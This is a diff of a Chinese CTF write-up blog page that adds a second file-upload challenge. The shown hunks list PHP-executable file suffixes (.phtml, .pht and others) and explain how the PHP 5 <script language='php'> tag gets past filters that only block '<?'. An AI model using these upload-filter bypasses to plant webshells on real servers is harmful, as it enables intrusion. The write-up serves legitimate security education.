@@ -21,31 +21,46 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="从一道入门上传题出发，完整走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程，并记录几个真实踩过的坑。">
+    <meta name="description" content="用两道入门上传题走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程：一道靠 .htaccess 解析 .phtml，一道靠 GIF89a 文件头和 PHP 5 老式 script 标签绕过内容黑名单。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web 文件上传实战：[ACTF2020 新生赛]Upload 详解">
+<meta property="og:title" content="Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解">
 <meta property="og:url" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/index.html">
 <meta property="og:site_name" content="Quellisya&#39;s Blog">
-<meta property="og:description" content="从一道入门上传题出发，完整走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程，并记录几个真实踩过的坑。">
+<meta property="og:description" content="用两道入门上传题走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程：一道靠 .htaccess 解析 .phtml，一道靠 GIF89a 文件头和 PHP 5 老式 script 标签绕过内容黑名单。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/01-upload-form.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/02-php-blacklist.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/03-not-image.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/04-upload-success.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/05-content-blacklist.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/06-script-tag-hex.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/07-phmtl-request.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/08-phmtl-url.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/09-parse-check.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/10-exec-ls.png">
+<meta property="og:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/11-flag.png">
 <meta property="article:published_time" content="2026-10-24T03:40:00.000Z">
-<meta property="article:modified_time" content="2026-10-24T03:40:00.000Z">
+<meta property="article:modified_time" content="2026-10-26T13:10:00.000Z">
 <meta property="article:author" content="Quellisya">
 <meta property="article:tag" content=".htaccess">
 <meta property="article:tag" content="ACTF">
+<meta property="article:tag" content="PHP 短标签">
 <meta property="article:tag" content="一句话木马">
 <meta property="article:tag" content="后缀绕过">
 <meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="文件头伪造">
+<meta property="article:tag" content="极客大挑战">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/2026/10/24/web-ctf-upload/01-upload-form.png">
 
 
 <link rel="canonical" href="https://quellisya.github.io/2026/10/24/web-ctf-upload/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/24/web-ctf-upload/","path":"/2026/10/24/web-ctf-upload/","title":"Web 文件上传实战：[ACTF2020 新生赛]Upload 详解"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/24/web-ctf-upload/","path":"/2026/10/24/web-ctf-upload/","title":"Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Web 文件上传实战：[ACTF2020 新生赛]Upload 详解 | Quellisya's Blog</title>
+<title>Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解 | Quellisya's Blog</title>
   
 
 
@@ -174,7 +189,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-%E5%85%88%E8%A1%A5%E4%B8%80%E7%82%B9%E5%9F%BA%E7%A1%80"><span class="nav-text">0. 先补一点基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%98%AF%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84"><span class="nav-text">0.1 文件上传漏洞是怎么产生的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-2-%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E4%B8%8D%E6%98%AF%E9%98%B2%E7%BA%BF"><span class="nav-text">0.2 前端校验不是防线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-3-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%AF%E8%83%BD%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E6%8B%A6"><span class="nav-text">0.3 服务端可能在哪些地方拦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-4-%E5%B8%B8%E8%A7%81%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%90%8E%E7%BC%80"><span class="nav-text">0.4 常见可执行后缀</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="nav-text">1. [ACTF2020 新生赛]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE"><span class="nav-text">1.1 观察题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%89%8D%E7%AB%AF%E5%88%B0%E5%BA%95%E6%8B%A6%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-text">1.2 前端到底拦了什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%80%8E%E4%B9%88%E6%8A%8A-phtml-%E5%8F%91%E5%87%BA%E5%8E%BB%EF%BC%88%E4%B8%8D%E7%94%A8-Burp%EF%BC%89"><span class="nav-text">1.3 怎么把 .phtml 发出去（不用 Burp）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%91%B8%E6%B8%85%E5%90%8E%E7%AB%AF%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text">1.4 摸清后端的黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E5%85%B3%E9%94%AE%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%93%AA%E4%B8%AA%E5%90%8E%E7%BC%80%E4%BC%9A%E8%A2%AB-PHP-%E8%A7%A3%E6%9E%90"><span class="nav-text">1.5 关键一步：哪个后缀会被 PHP 解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E6%9E%84%E9%80%A0%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">1.6 构造木马并上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8B%BF-flag"><span class="nav-text">1.7 执行命令，拿 flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%88%91%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91"><span class="nav-text">2. 我踩过的坑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-1%EF%BC%9A%E6%8A%8A%E6%9C%A8%E9%A9%AC%E6%94%B9%E5%90%8D%E6%88%90-jpg-%E5%8E%BB%E9%AA%97%E5%89%8D%E7%AB%AF"><span class="nav-text">坑 1：把木马改名成 .jpg 去骗前端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-2%EF%BC%9A%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A0%B9%E6%9C%AC%E4%B8%8D%E6%98%AF%E6%9C%A8%E9%A9%AC"><span class="nav-text">坑 2：上传的文件内容根本不是木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-3%EF%BC%9Aeval-%E6%89%A7%E8%A1%8C%E7%9A%84%E6%98%AF-PHP%EF%BC%8C%E4%B8%8D%E6%98%AF%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-text">坑 3：eval 执行的是 PHP，不是系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-4%EF%BC%9A%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%92%8C-system-%E6%B7%B7%E7%94%A8"><span class="nav-text">坑 4：变量函数调用和 system(...) 混用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-5%EF%BC%9AURL-%E9%87%8C%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%B2%A1%E7%BC%96%E7%A0%81"><span class="nav-text">坑 5：URL 里的特殊字符没编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-6%EF%BC%9A%E6%8A%8A%E2%80%9C%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E2%80%9D%E5%BD%93%E6%88%90%E2%80%9C%E6%9C%A8%E9%A9%AC%E5%8F%AF%E7%94%A8%E2%80%9D"><span class="nav-text">坑 6：把“上传成功”当成“木马可用”</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-text">3. 完整流程速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-text">4. 新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-text">5. 顺手聊聊怎么防</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E6%80%BB%E7%BB%93"><span class="nav-text">6. 总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-%E5%85%88%E8%A1%A5%E4%B8%80%E7%82%B9%E5%9F%BA%E7%A1%80"><span class="nav-text">0. 先补一点基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%98%AF%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84"><span class="nav-text">0.1 文件上传漏洞是怎么产生的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-2-%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E4%B8%8D%E6%98%AF%E9%98%B2%E7%BA%BF"><span class="nav-text">0.2 前端校验不是防线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-3-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%AF%E8%83%BD%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E6%8B%A6"><span class="nav-text">0.3 服务端可能在哪些地方拦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-4-%E5%B8%B8%E8%A7%81%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%90%8E%E7%BC%80"><span class="nav-text">0.4 常见可执行后缀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-5-PHP-%E7%9A%84%E5%87%A0%E7%A7%8D%E2%80%9C%E5%BC%80%E6%A0%87%E7%AD%BE%E2%80%9D"><span class="nav-text">0.5 PHP 的几种“开标签”</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="nav-text">1. [ACTF2020 新生赛]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE"><span class="nav-text">1.1 观察题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%89%8D%E7%AB%AF%E5%88%B0%E5%BA%95%E6%8B%A6%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-text">1.2 前端到底拦了什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%80%8E%E4%B9%88%E6%8A%8A-phtml-%E5%8F%91%E5%87%BA%E5%8E%BB%EF%BC%88%E4%B8%8D%E7%94%A8-Burp%EF%BC%89"><span class="nav-text">1.3 怎么把 .phtml 发出去（不用 Burp）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%91%B8%E6%B8%85%E5%90%8E%E7%AB%AF%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text">1.4 摸清后端的黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E5%85%B3%E9%94%AE%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%93%AA%E4%B8%AA%E5%90%8E%E7%BC%80%E4%BC%9A%E8%A2%AB-PHP-%E8%A7%A3%E6%9E%90"><span class="nav-text">1.5 关键一步：哪个后缀会被 PHP 解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E6%9E%84%E9%80%A0%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">1.6 构造木马并上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8B%BF-flag"><span class="nav-text">1.7 执行命令，拿 flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-text">2. [极客大挑战 2019]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE"><span class="nav-text">2.1 观察题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9A%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text">2.2 第一层：后缀黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A%E7%BB%99%E6%96%87%E4%BB%B6%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E5%A4%B4"><span class="nav-text">2.3 第二层：给文件加一个图片头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9A%E5%86%85%E5%AE%B9%E9%87%8C%E4%B8%8D%E8%83%BD%E5%87%BA%E7%8E%B0"><span class="nav-text">2.4 第三层：内容里不能出现 &lt;?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E7%BB%95%E8%BF%87%EF%BC%9A%E6%94%B9%E7%94%A8"><span class="nav-text">2.5 绕过：改用 &lt;script language&#x3D;&quot;php&quot;&gt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-%E5%AE%9A%E4%BD%8D%E6%96%87%E4%BB%B6%EF%BC%8C%E7%A1%AE%E8%AE%A4%E5%AE%83%E6%98%AF%E7%9C%9F%E8%A7%A3%E6%9E%90"><span class="nav-text">2.6 定位文件，确认它是真解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-%E4%BC%A0%E5%8F%82%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%8B%BF-flag"><span class="nav-text">2.7 传参执行，拿 flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-%E4%B8%A4%E9%A2%98%E5%AF%B9%E6%AF%94"><span class="nav-text">2.8 两题对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%88%91%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91"><span class="nav-text">3. 我踩过的坑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-1%EF%BC%9A%E6%8A%8A%E6%9C%A8%E9%A9%AC%E6%94%B9%E5%90%8D%E6%88%90-jpg-%E5%8E%BB%E9%AA%97%E5%89%8D%E7%AB%AF"><span class="nav-text">坑 1：把木马改名成 .jpg 去骗前端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-2%EF%BC%9A%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A0%B9%E6%9C%AC%E4%B8%8D%E6%98%AF%E6%9C%A8%E9%A9%AC"><span class="nav-text">坑 2：上传的文件内容根本不是木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-3%EF%BC%9Aeval-%E6%89%A7%E8%A1%8C%E7%9A%84%E6%98%AF-PHP%EF%BC%8C%E4%B8%8D%E6%98%AF%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-text">坑 3：eval 执行的是 PHP，不是系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-4%EF%BC%9A%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%92%8C-system-%E6%B7%B7%E7%94%A8"><span class="nav-text">坑 4：变量函数调用和 system(...) 混用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-5%EF%BC%9AURL-%E9%87%8C%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%B2%A1%E7%BC%96%E7%A0%81"><span class="nav-text">坑 5：URL 里的特殊字符没编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-6%EF%BC%9A%E6%8A%8A%E2%80%9C%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E2%80%9D%E5%BD%93%E6%88%90%E2%80%9C%E6%9C%A8%E9%A9%AC%E5%8F%AF%E7%94%A8%E2%80%9D"><span class="nav-text">坑 6：把“上传成功”当成“木马可用”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-7%EF%BC%9A%E5%90%8E%E7%BC%80%E6%8B%BC%E9%94%99%EF%BC%8C%E4%B8%8A%E4%BC%A0%E2%80%9C%E6%88%90%E5%8A%9F%E2%80%9D%E5%8D%B4%E6%B0%B8%E8%BF%9C%E4%B8%8D%E8%A7%A3%E6%9E%90"><span class="nav-text">坑 7：后缀拼错，上传“成功”却永远不解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-8%EF%BC%9A%E5%8F%AA%E7%9C%8B%E5%88%B0-GIF89a%EF%BC%8C%E5%88%A4%E6%96%AD%E4%B8%8D%E4%BA%86%E5%88%B0%E5%BA%95%E6%89%A7%E8%A1%8C%E6%B2%A1%E6%89%A7%E8%A1%8C"><span class="nav-text">坑 8：只看到 GIF89a，判断不了到底执行没执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-text">4. 完整流程速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-text">5. 新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-text">6. 顺手聊聊怎么防</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E6%80%BB%E7%BB%93"><span class="nav-text">7. 总结</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -196,7 +211,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -236,12 +251,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Web 文件上传实战：[ACTF2020 新生赛]Upload 详解 | Quellisya's Blog">
-      <meta itemprop="description" content="从一道入门上传题出发，完整走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程，并记录几个真实踩过的坑。">
+      <meta itemprop="name" content="Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解 | Quellisya's Blog">
+      <meta itemprop="description" content="用两道入门上传题走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程：一道靠 .htaccess 解析 .phtml，一道靠 GIF89a 文件头和 PHP 5 老式 script 标签绕过内容黑名单。">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Web 文件上传实战：[ACTF2020 新生赛]Upload 详解
+          Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解
         </h1>
 
         <div class="post-meta-container">
@@ -256,6 +271,13 @@
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-26 21:10:00" itemprop="dateModified" datetime="2026-10-26T21:10:00+08:00">2026-10-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
       <span class="post-meta-item-text">分类于</span>
@@ -267,7 +289,7 @@
   
 </div>
 
-            <div class="post-description">从一道入门上传题出发，完整走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程，并记录几个真实踩过的坑。</div>
+            <div class="post-description">用两道入门上传题走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程：一道靠 .htaccess 解析 .phtml，一道靠 GIF89a 文件头和 PHP 5 老式 script 标签绕过内容黑名单。</div>
         </div>
       </header>
 
@@ -277,9 +299,11 @@
     <div class="post-body" itemprop="articleBody"><div class="note primary"><p><strong>一分钟速览</strong></p>
 <ul>
 <li><strong>难度</strong>：入门</li>
-<li><strong>考点</strong>：前端校验绕过、后缀黑名单、<code>.htaccess</code> 解析映射</li>
-<li><strong>本题关键</strong>：黑名单漏了 <code>.phtml</code>，而服务器恰好把 <code>.phtml</code> 交给 PHP 解析</li>
-<li><strong>一句话思路</strong>：让请求里的 <code>filename</code> 保持 <code>.phtml</code>，再访问它确认真的执行</li>
+<li><strong>题目</strong>：[ACTF2020 新生赛]Upload、[极客大挑战 2019]Upload</li>
+<li><strong>考点</strong>：前端校验绕过、后缀黑名单、<code>Content-Type</code> &#x2F; 文件头校验、内容黑名单、<code>.htaccess</code> 解析映射</li>
+<li><strong>第一题关键</strong>：黑名单漏了 <code>.phtml</code>，而服务器恰好把 <code>.phtml</code> 交给 PHP 解析</li>
+<li><strong>第二题关键</strong>：内容黑名单只拦 <code>&lt;?</code>，改用 PHP 5 的 <code>&lt;script language=&quot;php&quot;&gt;</code> 标签就绕过了</li>
+<li><strong>一句话思路</strong>：让请求里的 <code>filename</code> 保持可执行后缀，再访问它确认真的执行</li>
 </ul>
 </div>
 
@@ -392,6 +416,37 @@
 <h3 id="0-4-常见可执行后缀"><a href="#0-4-常见可执行后缀" class="headerlink" title="0.4 常见可执行后缀"></a>0.4 常见可执行后缀</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  php3  php4  php5  php7  phtml  pht  phar  pgif  inc</span><br></pre></td></tr></table></figure>
 
 <p>其中 <code>phtml</code>、<code>pht</code> 能不能执行，<strong>完全取决于 Web 服务器的配置</strong>。记住这句话，后面会用到。</p>
+<h3 id="0-5-PHP-的几种“开标签”"><a href="#0-5-PHP-的几种“开标签”" class="headerlink" title="0.5 PHP 的几种“开标签”"></a>0.5 PHP 的几种“开标签”</h3><p>上传题的过滤，很多时候盯的就是“文件里有没有 <code>&lt;?</code>”。所以要知道 PHP 还有哪些等价写法：</p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>说明</th>
+<th>PHP 7</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?php ... ?&gt;</code></td>
+<td>标准标签，最常用</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>&lt;? ... ?&gt;</code></td>
+<td>短标签，需要 <code>short_open_tag</code> 打开</td>
+<td>取决于配置</td>
+</tr>
+<tr>
+<td><code>&lt;?= ... ?&gt;</code></td>
+<td>短输出标签，等价于 <code>&lt;?php echo ... ?&gt;</code></td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>&lt;script language=&quot;php&quot;&gt; ... &lt;/script&gt;</code></td>
+<td>PHP 5 专用，7.0 起移除</td>
+<td>❌</td>
+</tr>
+</tbody></table>
+<p>最后一种在 PHP 5 时代很常见，<strong>它一个 <code>&lt;?</code> 都不含</strong>。碰上“只拦 <code>&lt;?</code>”的内容黑名单，这就是现成的绕过写法，第二题会用到。</p>
 <hr>
 <h2 id="1-ACTF2020-新生赛-Upload"><a href="#1-ACTF2020-新生赛-Upload" class="headerlink" title="1. [ACTF2020 新生赛]Upload"></a>1. [ACTF2020 新生赛]Upload</h2><h3 id="1-1-观察题目"><a href="#1-1-观察题目" class="headerlink" title="1.1 观察题目"></a>1.1 观察题目</h3><p>打开靶机，页面很朴素，只有一个上传表单：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -431,7 +486,7 @@
 
 <p>它只做了一件事：<strong>取文件名最后一个点之后的内容，判断是不是 <code>.jpg</code> &#x2F; <code>.png</code> &#x2F; <code>.gif</code>。</strong></p>
 <p>也就是说，只要你选的文件叫 <code>xxx.phtml</code>，浏览器就会弹窗、表单不提交。但这只是浏览器里的提示。</p>
-<div class="note warning"><p>前端只认<strong>最后一个点</strong>后面的内容。<code>shell.phtml</code> 会被拦，<code>shell.jpg</code> 会放行——代价是服务端真的把文件存成 <code>.jpg</code>，永远不会执行。这是本文踩过的第一个坑，详见第 2 章。</p>
+<div class="note warning"><p>前端只认<strong>最后一个点</strong>后面的内容。<code>shell.phtml</code> 会被拦，<code>shell.jpg</code> 会放行——代价是服务端真的把文件存成 <code>.jpg</code>，永远不会执行。这是本文踩过的第一个坑，详见第 3 章。</p>
 </div>
 
